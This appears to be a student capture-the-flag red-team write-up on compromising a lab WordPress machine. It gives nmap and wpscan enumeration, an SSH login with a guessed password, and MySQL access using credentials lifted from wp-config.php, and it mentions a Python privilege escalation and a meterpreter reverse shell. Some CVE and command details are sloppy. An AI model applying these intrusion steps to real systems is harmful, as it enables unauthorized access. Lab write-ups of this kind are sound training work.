# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:
``` bash
$ nmap -sV 192.168.1.110
```
  ![](Images/Nmap%20open%20port%20and%20version%20scan.png)
  ![](Images/Target%201%20Machine.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - List of Exposed Services
    o	http
    o	rcpbind
    o	netbios-snn (Samba smbd 3.X-4.X)
    o	ssh


The following vulnerabilities were identified on each target:
- Target 1
  - List of Critical Vulnerabilities
  o	CVE-2018-15473 - OpenSSH 2.2 through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.
  o	CVE-2019-10092 – http Apache httpd In Apache HTTP Server 2.4.0 -2.4.39 (this version is 2.4.10 so this vulnerability would apply), a limited cross-site scripting issue was reported affecting the mod_proxy error page. An attacker could cause the link on the error page to be malformed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed.
  o	CVE-2017-8779 – rpcbind version 2-4 - rpcbind through 0.2.4, LIBTIRPC through 1.0.1 and 1.0.2-rc through 1.0.2-rc3, and NTIRPC through 1.4.3 do not consider the maximum RPC data size during memory allocation for XDR strings, which allows remote attackers to cause a denial of service (memory consumption with no subsequent free) via a crafted UDP packet to port 111, aka rpcbomb.
  o	CVE-2017-7494 - netbios-ssn (Samba smbd 3.X – 4.X) - Samba since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.
  o	CVE-2019-6579 open port 80 that we used to create exploit.php payload with msfvenom to open a meterpreter shell on the victim web server.

Vulnerability scan results 

![](Images/Nmap%20vulnerabilities%20scan.png)
![](Images/Nmap%20vulnerabilities%20scan%202.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: `flag1.txt` hash value_ b9bbcb33e11b80be759c4e844862482d 
    - **Exploit Used**
      - SSH into target 1
      - Commands:     ssh michael@192.168.1.110
                       cd /var/www/html 							
                       cat service.html or cat service.html | grep flag
                       ![](Images/Target%201%20ssh%20Michael.png)
                       ![](Images/Target%201%20flag%201.png)
  - `flag2.txt`: `flag2.txt` hash value_ fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - The fact we got access to michael’s directory and then the database directory www
      - ssh michael@192.168.1.110 						
        cd var/www/								
        ls 									
        cat flag2.txt
        ![](Images/Target%201%20flag%202.png)

    ### Enumerating WordPress site
    ![](Images/Target%201%20wpscan%20user%20enum%201.png
    ![](Images/Target%201%20wpscan%20user%20enum%202.png)

    No flags found here

    ### Use SSH to gain a user shell

    ![](Images/Target%201%20ssh%20Michael.png)

    Guessed Michael's password to be "michael"

    ### Find the MySQL database password

    ![](Images/MySQL%20database%20credentials.png)

    ### User password hashes in Mysql

    ![](Images/MySQL%20user%20password%20hashes.png)
     
    File with hashes of users
    ![](Images/File%20with%20hashes.png)

    ### Flags 3&4

    Exploit Used
    SSH - into target 1 as user ‘michael’ by guessing his weak password and gaining access to his wordpress directory and  wp-config.php file where you will find Michael’s mysql login credentials (user: root;        password: R@v3nSecurity) 
    wpscan - run a Wordpress scan on the IP target and then enumerate the users which identified Steven and Michael
    mysql - log into mysql with Michael’s credentials (user: root; password: R@v3nSecurity), select wordpress posts 
    Commands: 
    ssh michael@192.168.1.110						
    cd var/www/html/wordpress/wp-config.php				
    cat wp-config.php
    
    wpscan –url http://192.168.1.110/wordpress 			
    wpscan –url http://192.168.1.110/wordpress –enumerate u
    
    mysql -u root -p; enter the password 					
    show database; 							
    use wordpress;							 
    show tables;								 
    select * from wp_posts

    Exploit Used
    SSH-into target 1 as user ‘michael’ by guessing his weak password and gaining access to his wordpress directory and  wp-config.php file. Here you will find Michael’s mysql login credentials 
    wpscan - run a Wordpress scan on the IP target and then enumerate the users
    mysql - log into mysql (user: root; password: R@v3nSecurity), select wordpress posts 
    Commands:  
Same steps as flag3 


    ![](Images/MySQL%20database%20tables.png)
    ![](Images/MySQL%20flag%203%20%26%204.png)

    Escalating privileges to sudo with user Steven:
    Use this python command below because Steven is able to run python commands
    ![](Images/Privelege%20escelation%20with%20python.png)

    ### Exploit.php
    ![](Images/Metasploit%20reverse%20shell%20exploit%201.png)
    ![](Images/Metasploit%20reverse%20shell%20exploit%202.png)
    ![](Images/Metasploit%20reverse%20shell%20exploit%203'.png)
    ![](Images/HTTP%20Request%20Size%20Monitor%20alert%20test.png)

